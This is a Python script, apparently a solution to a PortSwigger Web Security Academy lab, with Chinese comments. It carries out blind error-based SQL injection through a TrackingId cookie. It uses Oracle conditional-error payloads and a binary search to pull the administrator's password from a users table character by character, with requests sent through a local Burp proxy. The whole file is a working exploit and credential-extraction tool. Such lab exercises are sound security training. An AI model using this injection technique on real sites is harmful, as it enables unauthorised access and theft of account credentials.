import requests
import time
import warnings
from tqdm import tqdm

#忽略waring
warnings.filterwarnings('ignore')

#小于
def lower(j,i):
    Cookie['TrackingId'] = "JWjn6TIQxHLzPk12'||(SELECT CASE WHEN (substr(password," + str(j) + ",1)<'" + lst[i]+ "') THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator')||'"
    #print(Cookie)
    r = requests.get(url=url, proxies=proxy, headers=header, verify=False, cookies=Cookie)
    if "Server Error" in r.text:
        #print("success")
        return 1
    else:
        return 0

#大于
def upper(j,i):
    Cookie['TrackingId'] = "JWjn6TIQxHLzPk12'||(SELECT CASE WHEN (substr(password," + str(j) + ",1)>'" + lst[i]+ "') THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator')||'"
    #print(Cookie)
    r = requests.get(url=url, proxies=proxy, headers=header, verify=False, cookies=Cookie)
    if "Server Error" in r.text:
        #print("success")
        return 1
    else:
        return 0
#二分查找
def binarySearch(lst,order, left, right):
    if left <= right:
        mid = (left + right)//2
        if lower(order,mid):
            right = mid - 1
        elif upper(order,mid):
            left = mid + 1
        else:
            print(lst[mid])
            print("get it:%c"%(lst[mid]))
            return lst[mid]
        return binarySearch(lst,order, left, right)
    else:
        print("can't find it.")
        return -1

if __name__ == '__main__':

    url = 'https://ac1b1fbb1e662838c00301de005900ad.web-security-academy.net/filter?category=Gifts'
    # 打开代理，burp抓包
    proxy = {
        'http': '127.0.0.1:8080',
        'https': '127.0.0.1:8080'
    }

    header = {
        'User - Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0'

    }

    Cookie = {
        'TrackingId': "",
        'session': 'oCkWsbQPRehVqxVLhCosJwMuOAfxR0R5'
    }

    #初始化字符串
    password=''
    #构造list
    lst = []
    for i in range(0x30, 0x7e):
        char = chr(i)
        if char.isalpha() or char.isnumeric():
            lst.append(char)

    for j in tqdm(range(1,21)):
        password+=binarySearch(lst,j,0,len(lst)-1)
    print(password)